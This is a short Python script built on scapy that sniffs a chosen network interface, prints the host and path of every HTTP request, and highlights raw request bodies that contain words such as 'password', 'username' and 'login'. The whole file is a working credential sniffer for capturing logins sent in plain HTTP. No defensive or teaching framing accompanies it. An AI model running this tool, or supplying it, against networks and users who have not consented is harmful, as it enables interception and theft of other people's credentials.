#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
from termcolor import colored

inputs = ['password', 'username', 'user', 'login', 'pass', 'User', 'Password']

def sniff(interface):

    scapy.sniff(iface=interface, store=False, prn=processPackets)

def processPackets(packet):

    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host + packet[HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet.load
            
            for word in inputs:
                if word in str(load):
                    print(colored(load, 'yellow'))
                    break

def main():

    interface = input('Please enter an interface: ')
    sniff(interface)

main()